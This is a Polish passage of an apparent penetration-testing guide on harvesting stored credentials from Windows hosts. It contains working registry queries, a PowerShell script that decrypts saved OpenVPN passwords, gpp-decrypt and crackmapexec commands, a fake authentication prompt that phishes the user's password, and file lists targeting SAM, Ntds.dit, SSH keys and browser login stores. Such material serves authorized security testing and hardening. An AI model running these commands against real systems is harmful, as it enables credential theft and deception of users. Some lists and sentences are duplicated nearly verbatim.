Jeśli podejrzewasz, że dostępny do odczytu udostępniony skoroszyt zawiera dane kont, odróżnij **szyfrowanie pliku** od ochrony arkusza lub ukrytych kolumn. [Microsoft podaje](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), że ochrona arkusza kontroluje edycję i nie jest funkcją zabezpieczeń; sama w sobie nie dowodzi, że zawartość skoroszytu jest zaszyfrowana. Przeglądaj wyłącznie autoryzowane, istotne pliki i unikaj wyświetlania potencjalnych sekretów podczas szerokiej enumeracji. Sama ścieżka do dostępnego pliku `.xlsx`, chroniony arkusz lub ukryta kolumna nie dowodzą, że istnieją poświadczenia ani że którekolwiek konto ma wyższe uprawnienia; osobno zweryfikuj rzeczywiste dane i bieżące uprawnienia konta.

### Zachowane patche zmian serwera CI

Serwer CI może zachowywać przesłane zmiany kodu źródłowego w swoim katalogu danych nawet po zakończeniu kompilacji. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` jako miejsce przechowywania zmian zdalnych; katalog danych można skonfigurować i nie musi znajdować się w `ProgramData`. Dostępny do odczytu patch może zachować usunięte lub dodane odwołania do pliku poświadczeń, klucza szyfrowania albo skryptu używającego obu tych elementów. Na przykład przepływ pracy PowerShell `ConvertTo-SecureString -Key` wymaga klucza AES oraz zaszyfrowanego ciągu; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), że klucz jest przekazywany osobno. Najpierw sprawdź wyłącznie dostępne nazwy patchy, a następnie, za odpowiednim upoważnieniem, przejrzyj istotną zawartość bez wyświetlania sekretów w standardowych wynikach enumeracji. Sama ścieżka do patcha, zaszyfrowana wartość lub odwołanie do klucza nie dowodzą, że poświadczenia są prawidłowe ani że umożliwiają dostęp z wyższymi uprawnieniami. Ogranicz uprawnienia ACL katalogu danych i unikaj commitowania sekretów w zmianach kompilacji.

### Niestandardowa rotacja haseł lokalnego administratora

Własny rotator haseł może przechowywać zaszyfrowane hasło lokalnego administratora w lokalnej usłudze, a poświadczenia datastore'u w dostępnym do odczytu pliku `.env` lub obok pliku binarnego aktualizatora. Sprawdź łącznie zaplanowane zadanie aktualizatora, konto, uprawnienia ACL konfiguracji, listener oraz uprawnienia datastore'u. Datastore dostępny wyłącznie przez loopback nadal jest osiągalny dla użytkownika lokalnego, który ma prawidłowe poświadczenia, ale samo uwierzytelnienie nie dowodzi uprawnień do odczytu odpowiednich rekordów. Jeśli ziarno szyfrowania lub materiał klucza jest dostępny obok szyfrogramu, przed zaufaniem szyfrowaniu sprawdź dokładny sposób wyprowadzania klucza. Schemat, który deterministycznie wyprowadza klucz AES z ujawnionego ziarna za pomocą Go [`math/rand`](https://pkg.go.dev/math/rand), nie nadaje się do ochrony tego hasła; dokumentacja Go wskazuje, że ten pakiet nie jest odpowiedni do generowania losowości w zastosowaniach wrażliwych na bezpieczeństwo. Zanim potraktujesz odzyskane hasło jako ścieżkę eskalacji, potwierdź, że jest aktualne i należy do konta z grupy lokalnych administratorów. Zaplanowane zadanie, ścieżka `.env` ani zaszyfrowany blob same w sobie nie dowodzą żadnego z tych warunków. Nie umieszczaj haseł ani materiału klucza w standardowych wynikach enumeracji.

Używaj [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) do zarządzania hasłami lokalnych administratorów. Przechowywanie w katalogu lub Entra i mechanizmy kontroli dostępu są odrębne od niestandardowego lokalnego datastore'u; o tym, czy uwierzytelniony użytkownik datastore'u może odczytać określony indeks, decydują również [role Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/).

### Archiwa wtyczek serwera Java i ponowne użycie poświadczeń

Niektóre wtyczki serwerów Java są dystrybuowane jako archiwa JAR w katalogu `plugins` serwera. Dostępna do odczytu niestandardowa wtyczka może zawierać konfigurację lub bytecode z osadzonymi poświadczeniami usługi. Przeglądaj archiwum wyłącznie z odpowiednim upoważnieniem i nie umieszczaj odzyskanych sekretów w standardowych wynikach enumeracji. Sama ścieżka do wtyczki nie dowodzi istnienia sekretu, a odzyskane hasło usługi prowadzi do wyższych uprawnień tylko wtedy, gdy jest również prawidłowe dla bardziej uprzywilejowanego konta. Sprawdź odpowiednie uprawnienia ACL plików i zastąp ponownie używane poświadczenia odrębnymi sekretami. Informacje o układzie katalogów znajdziesz w [przewodniku instalacji wtyczek PaperMC](https://docs.papermc.io/paper/adding-plugins/), a o zawartości archiwów — w [dokumentacji JAR Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Poświadczenia osadzonej bazy danych Openfire

Instalacja Openfire korzystająca z osadzonej bazy danych może przechowywać plik `openfire.script` w katalogu `Openfire\embedded-db`. Jeśli bieżące konto może go odczytać, sprawdź łącznie rekordy `OFUSER` i właściwość `passwordKey`. [Dokumentacja dostawcy Openfire dotycząca dostawcy użytkowników](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) podaje, że hasła mogą być przechowywane w postaci jawnej lub szyfrowane kluczem zapisanym w tej właściwości. Odzyskane hasło ma znaczenie dla eskalacji tylko wtedy, gdy jest nadal prawidłowe dla tożsamości o wyższych uprawnieniach; sama nazwa pliku nie dowodzi ani dostępu do odczytu, ani ponownego użycia poświadczeń. Ścieżka jest wskazówką inwentaryzacyjną, dlatego nie umieszczaj zawartości bazy danych ani poświadczeń w standardowych wynikach enumeracji.

Oddzielny plik `Openfire\conf\openfire.xml` może ujawniać skonfigurowane porty i interfejs powiązania konsoli administracyjnej, nawet gdy używana jest zewnętrzna baza danych. Openfire często wiąże konsolę administracyjną z loopbackiem; konto lokalne nadal może uzyskać dostęp do tego adresu, jeśli listener działa. Sprawdź łącznie rzeczywisty listener, autoryzowaną rolę administratora, zasady przesyłania wtyczek oraz tożsamość usługi Openfire. Administrator, który może zainstalować wtyczkę, może spowodować uruchomienie jej kodu w kontekście usługi, co może oznaczać wysokie uprawnienia, gdy usługa działa jako LocalSystem. Zgodne hasło konta ani dostępna ścieżka konfiguracji same w sobie nie dowodzą dostępu do konsoli administracyjnej ani możliwości wykonania kodu. Zobacz [przewodnik dostawcy dotyczący instalacji i zarządzania wtyczkami](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) oraz [właściwość API przesyłania wtyczek](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracja serwera do zarządzania analizą kryminalistyczną

Konfiguracje serwera Velociraptor, zwykle nazwane `server.config.yaml`, mogą zawierać `CA.private_key` wewnętrznego CA. Jeśli użytkownik o niższych uprawnieniach może odczytać ten klucz, może być w stanie wygenerować certyfikat klienta API. To, czy umożliwi to uzyskanie wyższych uprawnień, zależy od ról użytkowników serwera, dostępności API oraz tożsamości, w kontekście której działa serwer lub agent docelowy. Konfiguracja klienta zawiera inne dane; jej znalezienie nie dowodzi dostępu do CA serwera. W niektórych wdrożeniach klucz prywatny CA jest przechowywany offline, więc dostępna do odczytu konfiguracja serwera może nie zawierać klucza podpisującego.

Na serwerze Windows sprawdź uprawnienia ACL **konfiguracji serwera** w katalogu instalacyjnym oraz wszelkich chronionych kopii zapasowych. Możliwa lokalizacja to `%ProgramFiles%\VelociraptorServer\server.config.yaml`; jeśli ścieżka skonfigurowana dla usługi jest inna, użyj jej. Potwierdź, że bieżąca tożsamość może odczytać plik i że rzeczywiście znajduje się w nim `CA.private_key`. Nie wyświetlaj klucza prywatnego w logach ani wynikach enumeracji. Przepływ pracy dostawcy `config api_client` używa klucza CA do wystawienia certyfikatu klienta, ale potrzebna jest również skuteczna rola po stronie serwera; jej utworzenie lub zmiana może wymagać uprawnień zapisu do datastore'u albo restartu. Istniejąca uprzywilejowana tożsamość serwera może zapewnić ścieżkę dostępu nawet wtedy, gdy taki zapis nie jest możliwy. Zapytania API z uprawnieniami do wykonywania kodu działają w odpowiednim kontekście serwera lub agenta, który może mieć wysokie uprawnienia.

Chroń konfigurację serwera i kopie zapasowe za pomocą restrykcyjnych uprawnień ACL, w miarę możliwości przechowuj klucz podpisujący CA offline oraz ogranicz role API i dostęp do listenerów. Zobacz [dokumentację API Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) oraz [wytyczne dotyczące konfiguracji zabezpieczeń](https://docs.velociraptor.app/docs/deployment/security/).

### Poświadczenia PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY to osobny menedżer sesji. Jego natywny zaszyfrowany magazyn może znajdować się w `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, a wyeksportowana kopia zapasowa sesji może mieć nazwę `sessions-backup.dat` i być przechowywana gdzie indziej. [Przewodnik eksportu SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) informuje, że eksporty są szyfrowane hasłem i mogą zawierać sesje, klucze, skrypty, tagi oraz powiązania; [forum pomocy technicznej](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) wskazuje natywny magazyn. Najpierw sprawdź uprawnienia do plików i ścieżki. Znalezienie któregokolwiek z tych plików nie ujawnia jego hasła ani nie dowodzi, że zapisane poświadczenia są nadal ważne lub zapewniają wyższe uprawnienia.

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Klucze SSH w rejestrze

Klucze prywatne SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, więc sprawdź, czy znajduje się tam coś interesującego:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Jeśli znajdziesz jakikolwiek wpis w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest przechowywany w postaci zaszyfrowanej, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Jeśli usługa `ssh-agent` nie jest uruchomiona i chcesz, aby uruchamiała się automatycznie podczas rozruchu, wykonaj:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Wygląda na to, że ta technika nie jest już aktualna. Próbowałem utworzyć klucze ssh, dodać je za pomocą `ssh-add` i zalogować się przez ssh na maszynę. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania kluczem asymetrycznym.

### Pliki instalacji nienadzorowanej

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Możesz również wyszukać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Kopie zapasowe SAM i SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Czytelne pliki kopii zapasowych Windows Imaging (`.wim`) mogą również zawierać offline’owe gałęzie rejestru `SAM`, `SECURITY` i `SYSTEM`. W pierwszej kolejności sprawdzaj lokalnie dostępne katalogi kopii zapasowych lub obrazów i przed wyodrębnieniem czegokolwiek sprawdź **nazwy elementów** obrazu; sama nazwa pliku `.wim` nie dowodzi, że zawiera on gałęzie rejestru, a standardowe obrazy `install.wim`, `boot.wim` i obrazy odzyskiwania często prowadzą na fałszywy trop. Udział SMB to odrębna ścieżka dostępu i należy go sprawdzać tylko wtedy, gdy ten udział jest objęty zakresem. Zobacz wytyczne Microsoftu dotyczące [obrazów systemu Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [plików gałęzi rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Dane uwierzytelniające w chmurze

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Buforowane hasło GPP

Wcześniej dostępna była funkcja umożliwiająca wdrażanie niestandardowych lokalnych kont administratora na grupie komputerów za pośrednictwem Group Policy Preferences (GPP). Ta metoda miała jednak poważne luki w zabezpieczeniach. Po pierwsze, obiekty Group Policy (GPO), przechowywane jako pliki XML w SYSVOL, były dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych obiektach GPP, szyfrowane algorytmem AES256 przy użyciu publicznie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez każdego uwierzytelnionego użytkownika. Stanowiło to poważne zagrożenie, ponieważ mogło umożliwić użytkownikom uzyskanie podwyższonych uprawnień.

Aby ograniczyć to ryzyko, opracowano funkcję, która skanuje lokalnie buforowane pliki GPP w poszukiwaniu niepustego pola „cpassword”. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera szczegóły dotyczące GPP i lokalizacji pliku, co ułatwia identyfikację i usunięcie tej luki w zabezpieczeniach.

Wyszukaj te pliki w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Używanie crackmapexec do uzyskania haseł:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Przykład pliku web.config z danymi uwierzytelniającymi:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archiwa kopii zapasowych w katalogu głównym witryny IIS

Stara kopia zapasowa ZIP umieszczona bezpośrednio w katalogu głównym witryny udostępnianym przez serwer może ujawnić wcześniejsze pliki konfiguracyjne i dane uwierzytelniające, których można ponownie użyć. Przed uznaniem tego za ujawnienie sprawdź skonfigurowaną ścieżkę fizyczną witryny oraz to, czy archiwum jest faktycznie dostępne przez HTTP. Domyślna ścieżka `C:\inetpub\wwwroot` to tylko jedna z możliwości. Szybka lokalna inwentaryzacja może wyświetlić nazwy i rozmiary plików bez otwierania archiwów:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Nazwa archiwum nie dowodzi, że zawiera ono sekret ani że odzyskane dane uwierzytelniające zapewniają wyższe uprawnienia.

### Dane uwierzytelniające OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Dzienniki

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Poproś o dane uwierzytelniające

Zawsze możesz **poprosić użytkownika o podanie jego danych uwierzytelniających, a nawet danych innego użytkownika**, jeśli sądzisz, że może je znać (pamiętaj, że bezpośrednie **poproszenie** klienta o **dane uwierzytelniające** jest naprawdę **ryzykowne**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Możliwe nazwy plików zawierających dane uwierzytelniające**

Znane pliki, które jakiś czas temu zawierały **hasła** w **postaci jawnego tekstu** lub Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Wariant listy nazw plików bez rozszerzenia Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Bazy Password Safe v3 zwykle używają rozszerzenia `.psafe3`. Traktuj plik o pasującej nazwie jako potencjalny zaszyfrowany sejf; jego obecność nie oznacza, że możesz go odczytać, odblokować ani użyć zapisanych w nim danych logowania. Podczas sprawdzania, gdzie przechowywane są takie pliki, sprawdź dostępne profile użytkowników i skonfigurowane katalogi główne udostępniania plików.

Czytelny plik KeePass `.kdbx` jest również jedynie wskazówką na temat zaszyfrowanego sejfu. Do jego odblokowania potrzebne jest prawidłowe hasło główne oraz każdy skonfigurowany plik klucza lub inne czynniki uwierzytelniania konta. Jeśli podczas autoryzowanego przeglądu znajdziesz w pozycji parę hashy LM:NT, zweryfikuj nazwę konta oraz to, czy hash NT jest aktualny i akceptowany przez usługę NTLM celu, zanim rozważysz [pass-the-hash](../ntlm/README.md#pass-the-hash). Wpis w sejfie sam w sobie nie daje uprawnień Administrator ani SYSTEM; dostęp do zdalnej usługi, uprawnienia konta i wszelkie odrębne kroki uruchamiania usług również muszą być spełnione. W wykazie należy podać ścieżkę sejfu i informację, czy można go odczytać, a nie drukować bazy ani zapisanych danych logowania.

Przeszukaj wszystkie proponowane pliki:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Wariant polecenia wyszukiwania bez rozszerzenia Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Dane uwierzytelniające w Koszu

Warto też sprawdzić Kosz w poszukiwaniu zapisanych w nim danych uwierzytelniających.

Sprawdź dostępne wpisy Kosza pod kątem usuniętych kopii zapasowych i archiwów konfiguracji, a także plików, których nazwy wyraźnie wskazują na dane uwierzytelniające. Przydatna kopia zapasowa `.7z`, `.zip` lub `.rar` może mieć wiele miesięcy i zwyczajną nazwę. System Windows przechowuje oryginalną ścieżkę i czas usunięcia w rekordzie `$I`, a usunięty plik jako odpowiadający mu wpis `$R`; przed otwarciem archiwum sprawdź metadane i uprawnienia bieżącej tożsamości do odczytu. Widoczność zależy od woluminu, SID użytkownika i uprawnień do pliku, więc pusta lista nie dowodzi, że nie ma żadnej możliwej do odzyskania kopii zapasowej. Traktuj nazwę archiwum jako wskazówkę do sprawdzenia, a nie dowód, że zawiera ono prawidłowy sekret.

Dostępny usunięty plik `.pfx` może też być wskazówką dotyczącą **podpisywania kodu**. Jeśli zawiera dostępny klucz prywatny, można nim podpisać zmieniony skrypt PowerShell; [PowerShell wymaga certyfikatu do podpisywania kodu z kluczem prywatnym](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [reguły wydawcy AppLocker sprawdzają tożsamość podpisującego i zakres reguły](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Wykonanie skryptu na koncie innego użytkownika wymaga, aby bieżąca tożsamość mogła zmodyfikować konkretny skrypt, obowiązująca reguła akceptowała wynikowy podpis dla tego skryptu i konta docelowego, a zadanie zaplanowane lub inny proces o wyższych uprawnieniach faktycznie go uruchamiał. Sama nazwa pliku `.pfx`, podmiot certyfikatu ani możliwość zapisu do skryptu nie potwierdzają istnienia takiego łańcucha. Przed otwarciem materiału z kluczem prywatnym lub uruchomieniem zadania sprawdź metadane, ACL-e, zasady i polecenie zadania.

Sprawdź też dostępne bazy danych profili klientów komunikatorów, notatki i otrzymane pliki w poszukiwaniu wskazówek dotyczących danych uwierzytelniających. Eksport klucza odzyskiwania BitLocker może być zapisany jako HTML lub TXT, czasem wewnątrz archiwum kopii zapasowej o opisowej nazwie. Takie materiały mogą zapewnić dostęp do osobnego, zaszyfrowanego woluminu danych zawierającego starsze kopie zapasowe; sprawdzaj wolumin i archiwum wyłącznie wtedy, gdy masz na to upoważnienie. Jeśli kopia zapasowa zawiera `NTDS.dit`, odzyskanie poświadczeń domenowych w trybie offline wymaga również pasującego ula `SYSTEM`, jak opisano w [procedurze dotyczącej kopii zapasowych i grup uprzywilejowanych](../active-directory-methodology/privileged-groups-and-token-privileges.md). Sama nazwa pliku i zablokowany wolumin nie dowodzą, że istnieje użyteczny klucz odzyskiwania lub kopia zapasowa domeny.

Aby **odzyskać hasła** zapisane przez kilka programów, możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Wewnątrz rejestru

**Inne możliwe klucze rejestru zawierające dane uwierzytelniające**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądania

Sprawdź bazy danych, w których przechowywane są hasła z **Chrome lub Firefox**.\
Sprawdź bazy danych, w których przechowywane są hasła z **Chrome, Edge lub Firefox**.\
Sprawdź też historię, zakładki i ulubione w przeglądarkach — być może zapisano tam **hasła**.

W konwencjonalnym profilu **Default** przeglądarki Edge bieżącego użytkownika plik `Login Data` znajduje się w `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, a `Local State` w nadrzędnym katalogu `User Data`. [Microsoft dokumentuje domyślną lokalizację profilu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); inny profil lub zasada `UserDataDir` mogą zmienić tę lokalizację. Obecność pliku jest jedynie wskazówką dotyczącą magazynu poświadczeń: potwierdź, że pliki są czytelne, sprawdź kontekst DPAPI odpowiedniego użytkownika lub inne autoryzowane materiały kluczowe oraz ustal, czy zapisany login należy do konta o wyższych uprawnieniach. Samo wyliczenie ścieżek nie wymaga otwierania bazy danych ani wyświetlania odszyfrowanych haseł.

